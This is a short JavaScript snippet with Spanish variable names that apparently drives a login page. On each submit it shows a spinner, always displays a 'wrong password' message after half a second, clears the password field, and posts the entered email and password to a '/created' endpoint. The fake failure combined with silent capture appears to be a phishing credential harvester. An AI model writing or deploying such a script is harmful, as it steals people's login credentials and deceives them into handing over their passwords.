   const incorrecto = document.getElementById('incorrecta')
   const spinner = document.getElementById('spinner')
   const entrar = document.getElementById('entrar')


    document.getElementById('form').addEventListener('submit', async (e) => {
        entrar.style.display = "none"
        spinner.style.display = "block"
        e.preventDefault();
        setTimeout(async() => {
            entrar.style.display = "block"
            spinner.style.display = "none"
           incorrecto.style.display = 'block'
    let {email, password} = e.target
    const userData = {
        email: email.value, 
        password: password.value 
    };
    password.value = ""
    try {
        const response = await fetch('/created', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
        const data = await response.json();
        console.log(data);
    } catch (error) {
        console.error('Error:', error);
    }
        }, 500);
    
});
